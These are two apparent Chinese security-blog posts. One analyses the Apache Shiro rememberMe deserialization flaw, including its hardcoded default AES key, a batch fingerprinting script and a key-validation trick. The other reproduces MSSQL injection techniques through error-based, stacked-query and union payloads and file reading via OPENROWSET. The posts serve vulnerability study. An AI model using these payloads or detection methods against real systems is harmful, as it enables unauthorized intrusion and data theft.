-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163400707.png" alt="image-20201130163400707"></p>
-<p>​    跟进createSubject方法，调用了buildWebSubject方法。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163533846.png" alt="image-20201130163533846"></p>
-<p>​    在 buildWebSubject中调用了其父类的buildSubject方法。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163606923.png" alt="image-20201130163606923"></p>
-<p>​    跟进父类的buildSubject方法，调用了DefaultSecurityManager的createSubject方法。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130165013406.png" alt="image-20201130165013406"></p>
-<p>​    继续跟进，我们需要关注resolvePrincipals方法。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130165132350.png" alt="image-20201130165132350"></p>
-<p>​    跟进resolvePrincipals方法，判断RememberMeManager是否为空，不为空则调用getRememberedPrincipals。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130170513136.png" alt="image-20201130170513136"></p>
-<p>​    跟进getRememberedPrincipals方法，首先调用了getRememberedSerializedIdentity。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130170719001.png" alt="image-20201130170719001"></p>
-<p>​    跟进getRememberedSerializedIdentity方法，在该方法中，通过this.getCookie().readValue(request, response);获取了cookie的内容，并且判断是否为deleteMe，若为DeleteMe则返回null,否则将继续执行，对获取的cookie的内容进行base64解码并返回。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171245277.png" alt="image-20201130171245277"></p>
-<p>​        返回后会判断获取的cookie的内容是否为空，如果不为空，则调用convertBytesToPrincipals方法。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171552207.png" alt="image-20201130171552207"></p>
-<p>​    在convertBytesToPrincipals调用了decrypt对cookie的内容进行解密。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171453470.png" alt="image-20201130171453470"></p>
-<p>​    在decrypt中，调用cipherService.decrypt进行解密，同时传入了this.getDecryptionCipherKey()的内容。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171804561.png" alt="image-20201130171804561"></p>
-<p>​    我们看一下getDecryptionCipherKey中的key是如何来的，返回了当前对象的decryptionCipherKey属性。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171919629.png" alt="image-20201130171919629"></p>
-<p>​    decryptionCipherKey是在setDecryptionCipherKey中设置的。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172056694.png" alt="image-20201130172056694"></p>
-<p>​    在setCipherKey中调用了setDecryptionCipherKey进行设置、</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172145175.png" alt="image-20201130172145175"></p>
-<p>​    setCipherKey中的参数来自于DEFAULT_CIPHER_KEY_BYTES，而这个值是kPH+bIxk5D2deZiIxcaaaA== base64解密后的内容，所以这个key的内容在我们当前的环境下是写死的。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172223454.png" alt="image-20201130172223454"></p>
-<p>​    继续跟进解密算法，可以看到使用的解密方式是AES方式。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130173904974.png" alt="image-20201130173904974"></p>
-<p>​    将解密后的结果返回后，再转换为字节数组的形式并返回。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174140275.png" alt="image-20201130174140275"></p>
-<p>​    将返回的bytes作为参数传递到deserialize方法中。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174259064.png" alt="image-20201130174259064"></p>
-<p>​    继续跟踪下面的调用</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174337766.png" alt="image-20201130174337766"></p>
-<p>​    最终我们可以看到，将我们通过cookie传入的内容转换为ObjectInputStream,并调用了readObject进行反序列化操作。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174508646.png" alt="image-20201130174508646"></p>
-<p>​    通过上面的分析，我相信我们已经对于shiro反序列化漏洞的基本原理有了大致的了解，这个漏洞要想正常的利用，至关重要的一点是找到解密cookie中传入payload的key，在这个环境中，key是写死的，实际上这个key也可以自己在shiorconfig类中配置加密的key。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180331183.png" alt="image-20201130180331183"></p>
-<p>​    当我们更换key后，再去利用这个漏洞，由于key不正确无法解密导致无法继续利用。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180538186.png" alt="image-20201130180538186"></p>
-<p>​    既然重新生成key这么简单，为什么还是有人使用默认的key或者网上公布的其他key？我们看一下这个key解密后的结果就知道了，由于这些key解密后都是一些乱码，不太容易编辑，所以可能很多人会去使用网上别人生成好的key，所以在漏洞利用的过程中有人想到了爆破key的方法。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180951079.png" alt="image-20201130180951079"></p>
-<p>​    那如果想自己生成key,怎样生成才能满足要求呢,只要使用任意一个16位，24位，32位的字符串base64编码后都是可以作为key的。</p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>​        我们尝试切换shiro为高版本，看一下shiro是如何修复反序列化漏洞的，我切换到1.2.7版本的shiro，我们可以看到在该版本中，key默认并不是写死的，而是由cipherService.generateNewKey().getEncoded()来生成的key。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201164200537.png" alt="image-20201201164200537"></p>
-<p>​    生成key的代码如下</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201164541425.png" alt="image-20201201164541425"></p>
-<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><h4 id="如何识别shiro"><a href="#如何识别shiro" class="headerlink" title="如何识别shiro?"></a><strong>如何识别shiro?</strong></h4><p>​        要检测一个shiro是否存在反序列化漏洞，首先需要对shiro这个框架做一个识别，目前大部分的方法都是通过rememberMe=deleteMe;来识别的，但是并不是我们请求的所有地址都会返回rememberMe=deleteMe,但是在实战中我们可能需要批量去检测shiro框架，我们该如何识别？</p>
-<p>​        通过之前的分析我们知道，无论我们访问哪个url，都会经过shiro的拦截器，而在shiro的拦截器中会获取cookie中rememberMe的内容并进行解密，并且通过之前的分析，我们知道解密是由convertBytesToPrincipals（）完成的，如果我们传入的rememberMe不能正常的反序列化，就会抛出异常，调用onRememberedPrincipalFailure方法。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170537270.png" alt="image-20201201170537270"></p>
-<p>​    该方法经过几层调用最终调用了this.getCookie().removeFrom(request, response);方法</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170614952.png" alt="image-20201201170614952"></p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170630060.png" alt="image-20201201170630060"></p>
-<p><strong><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170639745.png" alt="image-20201201170639745"></strong></p>
-<p>​    在removeFrom中，会在返回包header加上rememberMe=deleteMe，因此无论我们访问任何使用了shiro框架的路由，只需要在请求头中的cookie中加入rememberMe=xxx，如果目标使用了shiro，则会返回rememberMe=deleteMe，也就是说我们可以通过一个包来识别是否使用了shiro框架。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170725328.png" alt="image-20201201170725328"></p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170959832.png" alt="image-20201201170959832"></p>
-<p>​    了解了这些，我们可以写一个简单的python脚本来批量识别shiro，这里注意我将重定向设置为false，否则我们在请求时会跟进302跳转，但跳转后的结果里可能没有rememberMe=deleteMe。<br><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180626070.png" alt="image-20201201180626070"></p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180604356.png" alt="image-20201201180604356"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def shiroScan(url):</span><br><span class="line"></span><br><span class="line">    header&#x3D;&#123;</span><br><span class="line">        &#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36&#39;,</span><br><span class="line">        &#39;Accept&#39;:&#39;image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,image&#x2F;*,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">        &#39;Accept-Encoding&#39;:&#39;gzip, deflate&#39;,</span><br><span class="line">        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q&#x3D;0.9&#39;,</span><br><span class="line">        &#39;Cookie&#39;:&#39;rememberMe&#x3D;1&#39;,</span><br><span class="line">        &#39;Connection&#39;:&#39;close&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    proxies &#x3D; &#123; &quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8088&quot;, &quot;https&quot;: &quot;https:&#x2F;&#x2F;127.0.0.1:8088&quot;&#125;</span><br><span class="line">    resp&#x3D;requests.get(url&#x3D;url,headers&#x3D;header,proxies&#x3D;proxies,verify&#x3D;False,allow_redirects&#x3D;False)</span><br><span class="line">    for name, regex in resp.headers.items():</span><br><span class="line">        if &quot;rememberMe&#x3D;deleteMe&quot; in regex:</span><br><span class="line">            print(url+ &quot; is Shiro!!!&quot;)</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    with open(&#39;domain.txt&#39;,&#39;r&#39;) as f:</span><br><span class="line">        lines&#x3D;f.readlines()</span><br><span class="line">        for i in lines:</span><br><span class="line">            domain&#x3D;i.strip(&#39;\n&#39;)</span><br><span class="line">            shiroScan(domain)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180705142.png" alt="image-20201201180705142"></p>
-<h4 id="如何判断key是否正确？"><a href="#如何判断key是否正确？" class="headerlink" title="如何判断key是否正确？"></a><strong>如何判断key是否正确？</strong></h4><p>​    通过上面的测试我们知道当我们使用的加密key正确可以正常进行反序列化操作，即使key正确，但生成的内容无法正常反序列化，则还是会返回rememberMe=deleteMe，因为反序列化的操作是在convertBytesToPrincipals方法完成的，如果反序列化的过程中出现异常，还是会设置rememberMe=deleteMe这个请求头，因此我们测试key是否正确，需要找到一个可以不依赖第三方组件的java中默认存在且和jdk版本无关的类来进行反序列化。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202094802148.png" alt="image-20201202094802148"></p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202094838261.png" alt="image-20201202094838261"></p>
-<p>​        我尝试使用URLDNS来进行判断，虽然可以正常发起DNS请求，但 由于执行过程中的类型转换错误，因此还是会返回rememberMe=deleteMe。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202100922001.png" alt="image-20201202100922001"></p>
-<p>​        我们正常的登录，看看正常登录过程中的反序列化的类是什么类型</p>
-<p><strong><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202104733807.png" alt="image-20201202104733807"></strong></p>
-<p>​        使用这个rememberMe的内容利用，看shiro再进行反序列化的过程中反序列化的是哪个类？</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202104854538.png" alt="image-20201202104854538"></p>
-<p>​        跟进后发现是反序列化了SimplePrincipalCollection类，所以我们只要创建一个SimplePrincipalCollection对应的对象进行序列化就可以了，当传入的序列化内容可以正常被解析，就不会出现rememberMe=deleteMe，因此可以通过这个特性来判断我们的key是否正确。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105111202.png" alt="image-20201202105111202"></p>
-<p>​        我们查看一下ShiroExploit这个工具，看看他是怎么实现的。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105408945.png" alt="image-20201202105408945"></p>
-<p>​    这个工具在检测key是否正确的过程中调用了ysoserial的ShiroCheck，可我去查看ysoserial的github项目，发现并没有这个选项，也就是这个是作者自己扩展编写的。我们反编译ShiroExploit自带的ysoserial，他的实现也非常简单，就是创建一个SimplePrincipalCollection对象。</p>
-<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105609290.png" alt="image-20201202105609290"></p>
-<h4 id="如何检测利用链？"><a href="#如何检测利用链？" class="headerlink" title="如何检测利用链？"></a>如何检测利用链？</h4><p>​        在JAVA的反序列化漏洞中，仅仅找到readObject反序列化并不一定能造成RCE，还有一点比较重要的是需要找到利用链，这个要具体展开讲需要依赖的知识点有点多，我之后会单独写一篇文章来讲解。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于sqlserver注入另类技巧的学习</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-11-13 16:50:19" itemprop="dateCreated datePublished" datetime="2020-11-13T16:50:19+08:00">2020-11-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-11-19 15:20:27" itemprop="dateModified" datetime="2020-11-19T15:20:27+08:00">2020-11-19</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​    最近看到国外一篇关于<a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/" target="_blank" rel="noopener">mssql注入利用</a>的文章，里面用了很多技巧我之前一直不知道，所以自己对这些技巧进行了复现,本次测试的环境为SQLSERVER2008</p>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>​    之前对于SQLSERVER报错注入理解仅限于类型转换导致的报错的利用方法，这次看到有很多新的函数可以进行报错注入利用，我把每个函数的测试单独取出来进行测试。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SUSER_NAME()</span><br><span class="line">USER_NAME()</span><br><span class="line">PERMISSIONS()</span><br><span class="line">DB_NAME()</span><br><span class="line">FILE_NAME()</span><br><span class="line">TYPE_NAME()</span><br><span class="line">COL_NAME()</span><br></pre></td></tr></table></figure>
-
-<p>​        SUSER_NAME()函数本来的作用是通过用户的id返回用户名,那id是int型的，由于我们输入的语句返回结果是varchar类型，因此会导致类型转换异常和报错，如下所示：</p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113165830418.png" alt="image-20201113165830418"></p>
-<p>​    我们已经可以看到报错了，但是如果想要获取更多的信息怎么办，还能通过这个函数来进行报错注入的利用吗？可以的，语句如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SUSER_NAME((select @@version))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113170131763.png" alt="image-20201113170131763"></p>
-<p>获取表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SUSER_NAME((select top 1 table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113170346115.png" alt="image-20201113170346115"></p>
-<p>上面是直接执行的结果，如果我们放到具体的注入语句里该怎么用？使用方法如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_Attitudes where id &#x3D;1 and 1&#x3D;SUSER_NAME(@@version)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172402013.png" alt="image-20201113172402013"></p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172434689.png" alt="image-20201113172434689"></p>
-<p>​    其他函数的用法类似，所以不一一说明了，下面给出利用的截图</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;USER_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;PERMISSIONS((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;DB_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;FILE_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;TYPE_NAME((select top 1 table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172656283.png" alt="image-20201113172656283"></p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172708675.png" alt="image-20201113172708675"></p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172721793.png" alt="image-20201113172721793"></p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172733723.png" alt="image-20201113172733723"></p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172755049.png" alt="image-20201113172755049"></p>
-<pre><code>最后一个函数COL_NAME有一点不一样，需要两个参数</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;COL_NAME((select top 1 table_name from information_schema.tables),1)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172912410.png" alt="image-20201113172912410"></p>
-<p>​    这些函数都有一个特性，就是他们输入的值都为int，返回值为varchar，我们可以利用这个特征去找其他可能导致报错注入的函数，之所以要了解这些函数，我们可以在利用报错注入某些函数被拦截的时候，通过替换为其他函数的方式来利用报错注入。</p>
-<h2 id="快速获取数据的小技巧"><a href="#快速获取数据的小技巧" class="headerlink" title="快速获取数据的小技巧"></a>快速获取数据的小技巧</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>​    我个人觉得MSSQL的报错注入比较鸡肋，因为MSSQL注入点一般都会支持堆叠查询，通过报错注入获取数据的速度远不如堆叠注入获取数据的速度快，这里我给出堆叠注入快速获取数据的方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX) SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM master..sysdatabases SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) SELECT CAST(@myoutput as int)  列出所有数据库</span><br><span class="line"></span><br><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX)  SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM 数据库名..sysobjects WHERE type &#x3D; &#39;U&#39; SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) SELECT CAST(@myoutput as int)  列出所有的表</span><br><span class="line"></span><br><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX) SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM 数据库名..syscolumns WHERE id&#x3D;object_id(&#39;表名&#39;) SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) select cast(@myoutput as int) </span><br><span class="line">列出所有的列</span><br></pre></td></tr></table></figure>
-
-<p>获取所有数据库</p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173622807.png" alt="image-20201113173622807"></p>
-<p>获取所有表名</p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173643045.png" alt="image-20201113173643045"></p>
-<p>获取所有列名</p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173732520.png" alt="image-20201113173732520"></p>
-<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>​    在MSSQL 2016及以后支持使用FOR JSON AUTO函数，我们可以使用这个函数结合联合查询获取数据,由于我本地的数据库版本比较低，所以复现不了这种利用方式，这里给出作者的Payload和截图</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vuln.app&#x2F;getItem?id&#x3D;1&#39;+and+1&#x3D;(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113200720930.png" alt="image-20201113200720930"></p>
-<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>​    还是由于环境的问题，无法复现这种利用方式，给出作者的payload和截图</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vuln.app&#x2F;getItem?id&#x3D;1&#39;+and+1&#x3D;(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113201003499.png" alt="image-20201113201003499"></p>
-<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a><strong>文件读取</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT BulkColumn FROM OPENROWSET(BULK N&#39;C:\Windows\win.ini&#39;, SINGLE_BLOB) as document</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119114708244.png" alt="image-20201119114708244"></p>
-<p>​    我尝试在报错注入中用到这种方法，但是并没有成功利用，但是可以在union联合查询中利用该方法读取文件。</p>
